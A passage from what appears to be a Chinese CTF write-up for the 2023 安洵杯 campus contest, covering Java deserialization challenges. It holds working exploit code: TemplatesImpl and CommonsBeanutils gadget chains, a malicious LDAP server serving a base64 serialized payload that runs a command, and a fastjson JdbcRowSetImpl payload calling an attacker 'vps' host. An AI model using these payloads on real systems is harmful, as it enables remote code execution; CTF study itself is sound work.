src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227120721067.png" alt="image-20231227120721067"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227120751819.png" alt="image-20231227120751819"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192346781.png" alt="image-20231226192346781"></p><p>接下来看看如何写出poc</p><p>从put方法看，要使key为恶意<code>TemplatesImpl</code></p><p>接着看putall方法</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192846004.png" alt="image-20231226192846004"></p><p>和前面的分析差不多，这里传入的是<code>HashMap</code>，经过iterator后是<code>HashMap$Node</code></p><p>前一个方法是<code>java.util.TreeMap$Entry</code>，都继承了<code>Map.Entry</code></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192951705.png" alt="image-20231226192951705"></p><p>就正常给<code>HashMap</code>的实例<code>put</code>进恶意<code>TemplatesImpl</code>即可</p><div class="code-wrapper"><pre><code class="hljs">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();    map.put(dataSource, dataSource);</code></pre></div><p>然后</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226193514249.png" alt="image-20231226193514249"></p><p>很明显，我们反射控制<code>maps[0]</code>为<code>HashMap</code>的实例即可控制map为<code>HashMap</code></p><p>有意思的是</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226193719022.png" alt="image-20231226193719022"></p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226193741884.png" alt="image-20231226193741884"></p><p>看这两处地方，等于说是环境已经配好，我们控制反序列化数据即可</p><p>和前一个分析差不多</p><p>其实理论上讲<code>HashMap</code>应该可以使用上面<code>TreeMap$Entry</code>的方式进行替代，我懒得想了，你可以试试</p><h3 id="HashMap-TreeMap"><a href="#HashMap-TreeMap" class="headerlink" title="HashMap+TreeMap"></a>HashMap+TreeMap</h3><p>不用那个<code>TreeBag</code>也可以，用原生JDK自带的。</p><p>不止<code>TreeMap</code>的<code>put</code>会调用<code>compare</code>，其<code>get</code>也会调用<code>compare</code></p><p>那哪里会调用<code>Map#get</code>呢，答案是<code>AbstractMap.equals</code>（刚好<code>TreeMap</code>没有重写<code>equals</code>方法）</p><p><code>HashMap#readObject</code>会调用<code>putVal</code>，<code>putVal</code>当遇到哈希碰撞时就会调用<code>equals</code></p><div class="code-wrapper"><pre><code class="hljs reasonml">TreeMap treeMap1 = make<span class="hljs-constructor">Tree(<span class="hljs-params">obj</span>, <span class="hljs-params">comparator</span>)</span>;TreeMap treeMap2 = make<span class="hljs-constructor">Tree(<span class="hljs-params">obj</span>, <span class="hljs-params">comparator</span>)</span>;HashMap hashMap = make<span class="hljs-constructor">Map(<span class="hljs-params">treeMap1</span>, <span class="hljs-params">treeMap2</span>)</span>;public static TreeMap&lt;Object, Object&gt; make<span class="hljs-constructor">Tree(Object <span class="hljs-params">o</span>, Comparator <span class="hljs-params">comparator</span>)</span> throws Exception &#123;    TreeMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> TreeMap&lt;&gt;<span class="hljs-literal">()</span>;    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">map</span>, <span class="hljs-string">&quot;size&quot;</span>, 1)</span>;    Class&lt;?&gt; nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>)</span>;    Constructor nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;    nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    Object node = nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">o</span>, 1, <span class="hljs-params">null</span>)</span>;    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">map</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-params">node</span>)</span>;    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">map</span>, <span class="hljs-string">&quot;comparator&quot;</span>, <span class="hljs-params">comparator</span>)</span>;    return map;&#125;public static HashMap&lt;Object, Object&gt; make<span class="hljs-constructor">Map(Object <span class="hljs-params">v1</span>, Object <span class="hljs-params">v2</span>)</span> throws Exception &#123;    HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;    Class&lt;?&gt; nodeC;    <span class="hljs-keyword">try</span> &#123;        nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;    &#125; catch (ClassNotFoundException e) &#123;        nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;    &#125;    Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;    nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v1</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-params">null</span>)</span>);    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">1</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v2</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-params">null</span>)</span>);    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;    return s;&#125;</code></pre></div><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>模板注入的payload放入<code>BaseDataSource</code> 的url的话会被urlencode，所以放入<code>ServerNames</code>中</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230750413.png" alt="image-20231226230750413"></p><p>exp拿去url编码</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230829491.png" alt="image-20231226230829491"></p><p>然后访问<code>/</code>目录</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230923364.png" alt="image-20231226230923364"></p><p>先列目录，最好查看源代码，先找到结果生成的位置，位于两红框中间</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230717560.png" alt="image-20231226230717560"></p><h2 id="ai-java"><a href="#ai-java" class="headerlink" title="ai_java"></a>ai_java</h2><div class="code-wrapper"><pre><code class="hljs x86asm">亲爱的朋友，如果你正在阅读这封信，那意味着我已经离开了这个世界，而你是唯一一个我能相信的人。我希望你能理解我为什么选择以这种方式与你联系。在我最近的研究中，我发现了一些关于人工智能存在的漏洞，这些漏洞可能导致AI系统在某些情况下出现异常行为甚至失控。这些发现对AI行业和整个社会都有巨大的影响。然而，我发现了一些令人不安的迹象，似乎有人对我的研究产生了浓厚的兴趣，并试图阻止我揭示这些漏洞。我收到了匿名威胁，警告我停止研究并销毁所有相关的数据和成果。但我不能就此罢手，因为这个发现对人类的未来至关重要。我已经采取了一些措施来保护我的研究成果，但我知道这可能不够。如果我在某个时候离奇死亡，请你继续我的事业。我相信你的技术能力和正直的品质，你是唯一一个我能信任的人。我已经将我的研究备忘录和重要的数据存放在加密文件中，并将其隐藏在一个安全的位置。这个位置只有你知道，密钥我放在公司服务器了，帐号是TvT/TvT，相关线索我都放在<span class="hljs-keyword">js</span>代码中了。我相信以你的能力可以轻易的获取他。我希望你能找到它，将文件解密。并将它带到公众的视野中。请小心行事，并确保你的安全。这是一项危险的任务，但我们不能让那些企图掩盖真相的人得逞。我相信你能理解这个事业的重要性，并为之奋斗到底。感谢你一直以来的支持和友谊。请记住，无论发生什么，我们都必须追求真相和正义。祝你好运。真诚的，Jonathan</code></pre></div><p>都是废话，关键就一句</p><div class="code-wrapper"><pre><code class="hljs x86asm">帐号是TvT/TvT，相关线索我都放在<span class="hljs-keyword">js</span>代码中了</code></pre></div><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226194748123.png" alt="image-20231226194748123"></p><p>有一段jsfuck，控制台运行，弹出个<code>c</code>，不理解</p><p>然后看到有一个函数叫c，控制台执行c函数，出现了github的链接，忘截图了</p><p>他commit了四次，在第二次增加文件的地方打开能下载jar包       （就做到这里了，没时间看了）</p><p>官方wp</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226195221950.png" alt="image-20231226195221950"></p><p>git切换版本下载文件</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231230034702368.png" alt="image-20231230034702368"></p><h3 id="未授权绕过"><a href="#未授权绕过" class="headerlink" title="未授权绕过"></a>未授权绕过</h3><p>CVE-2022-22978   </p><p><code>.</code>不会匹配<code>\r\n</code>换行符</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>fastjson版本为1.2.46</p><p>高版本jdk，ldap打不了，</p><p>存在</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>能够利用LDAP反序列化来绕过高版本jdk对<code>ldap</code>的限制</p><p>原理就是在 LDAP 服务器返回查询结果的时候设置了 <code>javaSerializedData</code> 这个 <code>attribute</code>, 然后客户端就会调用 <code>deserializeObject</code> 进行反序列化</p><p>缺点在于需要知道目标机的本地 <code>classpath</code> 中是否存在相应的 gadget</p><p>这里依赖中有个低版本的shrio，存在不用靠其他依赖的CB链</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><div class="code-wrapper"><pre><code class="hljs reasonml">public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;    byte<span class="hljs-literal">[]</span> code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>)</span>);    TemplatesImpl obj = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">obj</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123;<span class="hljs-params">code</span>&#125;)</span>;    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">obj</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;zeropeach&quot;</span>)</span>;    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">obj</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);    BeanComparator comparator = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BeanComparator(<span class="hljs-params">null</span>,String.CASE_INSENSITIVE_ORDER)</span>;    Queue queue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">PriorityQueue(2, <span class="hljs-params">comparator</span>)</span>;    queue.add(<span class="hljs-string">&quot;1&quot;</span>);    queue.add(<span class="hljs-string">&quot;1&quot;</span>);    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">comparator</span>, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>)</span>;    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">queue</span>, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">obj</span>, <span class="hljs-params">obj</span>&#125;)</span>;    ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;    ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;    oos.write<span class="hljs-constructor">Object(<span class="hljs-params">queue</span>)</span>;    oos.close<span class="hljs-literal">()</span>;    String a = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>);    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(a);&#125;</code></pre></div><p>使用下面这个在vps进行ldap监听</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> basic;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<span class="hljs-keyword">import</span> com.unboundid.util.Base64;<span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<span class="hljs-keyword">import</span> javax.net.SocketFactory;<span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<span class="hljs-keyword">import</span> java.net.InetAddress;<span class="hljs-keyword">import</span> java.net.MalformedURLException;<span class="hljs-keyword">import</span> java.net.URL;<span class="hljs-keyword">import</span> java.text.ParseException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://vps_ip:port/#Evil&quot;</span>;                <span class="hljs-comment">//监听ldap请求的端口</span>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(                    <span class="hljs-string">&quot;listen&quot;</span>,                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);            ds.startListening();        &#125;        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;        <span class="hljs-keyword">private</span> URL codebase;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;            <span class="hljs-built_in">this</span>.codebase = cb;        &#125;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><span class="hljs-comment">         *</span><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><span class="hljs-comment">         */</span>        <span class="hljs-meta">@Override</span>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">(InMemoryInterceptedSearchResult result )</span> &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);            <span class="hljs-keyword">try</span> &#123;                sendResult(result, base, e);            &#125;            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;                e1.printStackTrace();            &#125;        &#125;        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);            &#125;<span class="hljs-comment">//             Payload1: 利用 LDAP + Reference Factory</span><span class="hljs-comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><span class="hljs-comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span><span class="hljs-comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><span class="hljs-comment">//             Payload2: 返回序列化 Gadget</span>            <span class="hljs-keyword">try</span> &#123;                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="hljs-string">&quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABSPK/rq+AAAANAAsCgAGAB4KAB8AIAgAIQoAHwAiBwAjBwAkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMZXhwOwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAmAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAIZXhwLmphdmEMAAcACAcAJwwAKAApAQAEY2FsYwwAKgArAQADZXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAACwAEAA0ADQARAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAFgALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAA4AAAAEAAEAFgABABAAFwACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAGwALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABgAGQACAAAAAQAaABsAAwAOAAAABAABABYAAQAcAAAAAgAdcHQACXplcm9wZWFjaHB3AQB4cQB+AA14&quot;</span>));            &#125; <span class="hljs-keyword">catch</span> (ParseException exception) &#123;                exception.printStackTrace();            &#125;            result.sendSearchEntry(e);            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));        &#125;    &#125;&#125;</code></pre></div><p>那剩下的就是fastjson 1.2.47以下都能用的缓存绕过啦</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://vps:port/anything&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>: true&#125;&#125;</code></pre></div><p>本地尝试</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231230043238665.png" alt="image-20231230043238665"></p><h2 id="Swagger-docs"><a href="#Swagger-docs" class="headerlink" title="Swagger docs"></a>Swagger docs</h2><p>读文档</p><p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226234244580.png" alt="image-20231226234244580"></p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-attr">&quot;definitions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;UserRegistration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;object&quot;</span><span class="hljs-punctuation">,</span>        <span 